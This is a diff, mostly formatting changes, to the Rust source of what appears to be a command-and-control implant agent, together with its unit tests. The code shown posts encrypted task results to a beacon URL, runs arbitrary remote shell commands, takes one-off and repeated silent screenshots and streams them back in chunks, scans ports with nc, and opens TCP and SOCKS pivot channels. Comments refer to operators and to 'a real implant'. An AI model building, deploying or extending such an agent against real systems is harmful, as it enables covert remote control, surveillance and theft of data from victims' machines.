@@ -149,23 +149,38 @@ pub fn run(cfg: Config) -> anyhow::Result<()> {
                 if estimated_size > BATCH_FLUSH {
                     // 单条本身就很大（不应发生——分块应该保证每条 <128KB）
                     // 直接发这条独占一个帧
-                    let single = vec![TaskResponse { task_id: t.task_id, response }];
-                    let frame = encode_frame(&pubkey, counter, &key, &TaskResponse::encode_vec(&single));
+                    let single = vec![TaskResponse {
+                        task_id: t.task_id,
+                        response,
+                    }];
+                    let frame =
+                        encode_frame(&pubkey, counter, &key, &TaskResponse::encode_vec(&single));
                     if let Err(e) = ureq::post(&beacon_url).send_bytes(&frame) {
                         tracing::warn!(error = %e, "beacon send failed (oversized chunk); response dropped");
                     }
                     counter += 1;
                     continue;
                 }
-                let current_batch_size: usize = pending_responses.iter()
+                let current_batch_size: usize = pending_responses
+                    .iter()
                     .map(|tr| match &tr.response {
                         Response::FileChunk { data, .. } => data.len(),
-                        Response::Output(d) | Response::BofOutput(d) | Response::Image(d) => d.len(),
+                        Response::Output(d) | Response::BofOutput(d) | Response::Image(d) => {
+                            d.len()
+                        }
                         _ => 0,
-                    }).sum();
-                if current_batch_size + estimated_size > BATCH_FLUSH && !pending_responses.is_empty() {
+                    })
+                    .sum();
+                if current_batch_size + estimated_size > BATCH_FLUSH
+                    && !pending_responses.is_empty()
+                {
                     // Flush 当前批次
-                    let frame = encode_frame(&pubkey, counter, &key, &TaskResponse::encode_vec(&pending_responses));
+                    let frame = encode_frame(
+                        &pubkey,
+                        counter,
+                        &key,
+                        &TaskResponse::encode_vec(&pending_responses),
+                    );
                     if let Err(e) = ureq::post(&beacon_url).send_bytes(&frame) {
                         tracing::warn!(error = %e, "beacon send failed (batch flush); response batch dropped");
                     }
@@ -232,10 +247,20 @@ fn execute(cmd: Command, work_dir: &Path) -> Vec<Response> {
         // so a long-lived forwarding task doesn't fit it without the
         // persistent-task refactor flagged in the design doc. Socks likewise
         // acknowledges the opcode without a full SOCKS5 state machine.
-        Command::Connect { proto, host, port, chan } => {
+        Command::Connect {
+            proto,
+            host,
+            port,
+            chan,
+        } => {
             vec![do_connect(proto, &host, port, chan)]
         }
-        Command::Socks { chan, op, addr, port } => {
+        Command::Socks {
+            chan,
+            op,
+            addr,
+            port,
+        } => {
             vec![do_socks(chan, op, &addr, port)]
         }
         // Relay data/close: the dev agent keeps no channel table (full
@@ -291,17 +316,20 @@ fn do_screenshot(monitor: u8) -> Vec<Response> {
             .arg(&tmp)
             .output();
         let png = match result {
-            Ok(out) if out.status.success() => {
-                match std::fs::read(&tmp) {
-                    Ok(data) => {
-                        let _ = std::fs::remove_file(&tmp);
-                        data
-                    }
-                    Err(e) => return vec![Response::Err(format!("screenshot: read {e}"))],
+            Ok(out) if out.status.success() => match std::fs::read(&tmp) {
+                Ok(data) => {
+                    let _ = std::fs::remove_file(&tmp);
+                    data
                 }
+                Err(e) => return vec![Response::Err(format!("screenshot: read {e}"))],
+            },
+            Ok(out) => {
+                return vec![Response::Err(format!(
+                    "screenshot: {} failed: {}",
+                    prog,
+                    String::from_utf8_lossy(&out.stderr)
+                ))]
             }
-            Ok(out) => return vec![Response::Err(format!("screenshot: {} failed: {}", prog,
-                String::from_utf8_lossy(&out.stderr)))],
             Err(e) => return vec![Response::Err(format!("screenshot: {prog} not found: {e}"))],
         };
         // 分块流回（每块 128KB，安全在 MAX_CT_LEN 256KB 以内）
@@ -318,7 +346,12 @@ fn do_screenshot(monitor: u8) -> Vec<Response> {
             });
         }
         if chunks.is_empty() {
-            chunks.push(Response::FileChunk { name, seq: 0, eof: 1, data: Vec::new() });
+            chunks.push(Response::FileChunk {
+                name,
+                seq: 0,
+                eof: 1,
+                data: Vec::new(),
+            });
         }
         chunks
     }
@@ -334,7 +367,8 @@ fn do_portscan(host: &str, ports: &str) -> Response {
     for port in targets {
         let open = std::process::Command::new("nc")
             .arg("-z")
-            .arg("-w").arg("2")
+            .arg("-w")
+            .arg("2")
             .arg(host)
             .arg(port.to_string())
             .output()
@@ -424,7 +458,10 @@ fn do_env(name: &str) -> Response {
 fn run_shell_raw(args: &str) -> String {
     #[cfg(unix)]
     {
-        std::process::Command::new("sh").arg("-c").arg(args).output()
+        std::process::Command::new("sh")
+            .arg("-c")
+            .arg(args)
+            .output()
             .map(|o| String::from_utf8_lossy(&o.stdout).into_owned())
             .unwrap_or_else(|e| format!("! {e}"))
     }
@@ -460,7 +497,10 @@ fn do_screenwatch(interval_secs: u32) -> Vec<Response> {
         let tmp = format!("/tmp/nyx_sw_{}_{}.png", std::process::id(), i);
         #[cfg(unix)]
         {
-            let r = std::process::Command::new("screencapture").arg("-x").arg(&tmp).output();
+            let r = std::process::Command::new("screencapture")
+                .arg("-x")
+                .arg(&tmp)
+                .output();
             if let Ok(out) = r {
                 if out.status.success() {
                     if let Ok(data) = std::fs::read(&tmp) {
@@ -468,9 +508,16 @@ fn do_screenwatch(interval_secs: u32) -> Vec<Response> {
                         const CHUNK: usize = 128 * 1024;
                         let name = format!("screenwatch-{i}.png");
                         for (seq, block) in data.chunks(CHUNK).enumerate() {
-                            let eof = if (seq + 1) * CHUNK >= data.len() { 1 } else { 0 };
+                            let eof = if (seq + 1) * CHUNK >= data.len() {
+                                1
+                            } else {
+                                0
+                            };
                             all_chunks.push(Response::FileChunk {
-                                name: name.clone(), seq: seq as u32, eof, data: block.to_vec(),
+                                name: name.clone(),
+                                seq: seq as u32,
+                                eof,
+                                data: block.to_vec(),
                             });
                         }
                     }
@@ -479,7 +526,9 @@ fn do_screenwatch(interval_secs: u32) -> Vec<Response> {
         }
     }
     if all_chunks.is_empty() {
-        vec![Response::Err("screenwatch: screencapture not available".into())]
+        vec![Response::Err(
+            "screenwatch: screencapture not available".into(),
+        )]
     } else {
         all_chunks
     }
@@ -614,7 +663,11 @@ fn do_connect(proto: u8, host: &str, port: u16, chan: u32) -> Response {
     }
     // Resolve first so we can distinguish "host not found" from "host found,
     // port closed" — connect_timeout needs a concrete SocketAddr.
-    let addr = match (host, port).to_socket_addrs().ok().and_then(|mut a| a.next()) {
+    let addr = match (host, port)
+        .to_socket_addrs()
+        .ok()
+        .and_then(|mut a| a.next())
+    {
         Some(a) => a,
         None => return Response::Err(format!("connect {host}:{port}: host resolution failed")),
     };
@@ -624,7 +677,11 @@ fn do_connect(proto: u8, host: &str, port: u16, chan: u32) -> Response {
             // Reporting open lets the operator confirm reachability; the TUI
             // draws the pivot edge. A real implant would hand the handle to a
             // background relay task.
-            Response::Channel { chan, status: 0, data: Vec::new() }
+            Response::Channel {
+                chan,
+                status: 0,
+                data: Vec::new(),
+            }
         }
         Err(e) => Response::Err(format!("connect {host}:{port}: {e}")),
     }
@@ -670,7 +727,11 @@ fn run_shell(args: &str) -> Response {
     let (prog, flag) = ("sh", "-c");
     #[cfg(windows)]
     let (prog, flag) = ("cmd.exe", "/C");
-    match std::process::Command::new(prog).arg(flag).arg(args).output() {
+    match std::process::Command::new(prog)
+        .arg(flag)
+        .arg(args)
+        .output()
+    {
         Ok(out) => {
             let mut buf = out.stdout;
             buf.extend_from_slice(&out.stderr);
@@ -749,8 +810,7 @@ fn safe_resolve(work_dir: &Path, remote: &str) -> Result<PathBuf, String> {
     if p.is_absolute() {
         return Err("absolute paths are not allowed".into());
     }
-    if p
-        .components()
+    if p.components()
         .any(|c| matches!(c, std::path::Component::ParentDir))
     {
         return Err("`..` traversal is not allowed".into());
@@ -758,7 +818,8 @@ fn safe_resolve(work_dir: &Path, remote: &str) -> Result<PathBuf, String> {
     let joined = work_dir.join(p);
     // canonicalize 防护：resolve 所有 symlink 后确认仍在 work_dir 内。
     // work_dir 本身必须存在且可 canonicalize（agent 启动时保证）。
-    let canon_work = work_dir.canonicalize()
+    let canon_work = work_dir
+        .canonicalize()
         .map_err(|e| format!("work_dir canonicalize failed: {e}"))?;
     // 目标可能还不存在（Mkdir），所以 canonicalize 父目录 + 拼最后一段。
     let check = match joined.canonicalize() {
@@ -921,8 +982,10 @@ mod tests {
         {
             std::os::unix::fs::symlink(&outside, work.join("escape.link")).unwrap();
             // 通过 symlink 访问外部文件 → 必须被拒
-            assert!(safe_resolve(&work, "escape.link").is_err(),
-                "symlink 逃逸必须被 safe_resolve 拒绝");
+            assert!(
+                safe_resolve(&work, "escape.link").is_err(),
+                "symlink 逃逸必须被 safe_resolve 拒绝"
+            );
         }
     }
 
@@ -933,8 +996,10 @@ mod tests {
         let work = dir.path().to_path_buf();
         fs::create_dir_all(&work).unwrap();
         let resp = do_fileop(FileOp::Rm, &work, ".", None);
-        assert!(matches!(resp, Response::Err(ref e) if e.contains("work root")),
-            "rm . 应被拒，got: {resp:?}");
+        assert!(
+            matches!(resp, Response::Err(ref e) if e.contains("work root")),
+            "rm . 应被拒，got: {resp:?}"
+        );
     }
 
     #[test]
@@ -962,8 +1027,10 @@ mod tests {
         // Only proto 0 (TCP) is supported; anything else must surface as an
         // error rather than attempting a connection.
         let resp = do_connect(7, "127.0.0.1", 80, 42);
-        assert!(matches!(resp, Response::Err(ref e) if e.contains("proto")),
-            "non-TCP proto should be rejected, got: {resp:?}");
+        assert!(
+            matches!(resp, Response::Err(ref e) if e.contains("proto")),
+            "non-TCP proto should be rejected, got: {resp:?}"
+        );
     }
 
     #[test]
@@ -971,8 +1038,10 @@ mod tests {
         // A hostname that can't resolve must come back as Err (host resolution
         // failed), not panic or hang.
         let resp = do_connect(0, "nx-host-does-not-exist-invalid", 80, 1);
-        assert!(matches!(resp, Response::Err(ref e) if e.contains("resolution")),
-            "unresolvable host should be Err, got: {resp:?}");
+        assert!(
+            matches!(resp, Response::Err(ref e) if e.contains("resolution")),
+            "unresolvable host should be Err, got: {resp:?}"
+        );
     }
 
     #[test]
@@ -980,23 +1049,36 @@ mod tests {
         // 127.0.0.1:1 is a privileged port nothing should be listening on;
         // connect must fail and we must surface it as Err within the timeout.
         let resp = do_connect(0, "127.0.0.1", 1, 9);
-        assert!(matches!(resp, Response::Err(_)),
-            "closed port should be Err, got: {resp:?}");
+        assert!(
+            matches!(resp, Response::Err(_)),
+            "closed port should be Err, got: {resp:?}"
+        );
     }
 
     #[test]
     fn do_socks_rejects_unsupported_op() {
         // op 1 (CONNECT) is the only supported opcode; bind/udp must error.
         let resp = do_socks(5, 2, "127.0.0.1", 1080);
-        assert!(matches!(resp, Response::Err(ref e) if e.contains("op")),
-            "unsupported socks op should be Err, got: {resp:?}");
+        assert!(
+            matches!(resp, Response::Err(ref e) if e.contains("op")),
+            "unsupported socks op should be Err, got: {resp:?}"
+        );
     }
 
     #[test]
     fn do_socks_connect_op_reports_channel() {
         // op 1 (CONNECT) acknowledges the channel as open with a status note.
         let resp = do_socks(7, 1, "example.com", 443);
-        assert!(matches!(resp, Response::Channel { chan: 7, status: 0, .. }),
-            "socks connect should report open channel, got: {resp:?}");
+        assert!(
+            matches!(
+                resp,
+                Response::Channel {
+                    chan: 7,
+                    status: 0,
+                    ..
+                }
+            ),
+            "socks connect should report open channel, got: {resp:?}"
+        );
     }
 }
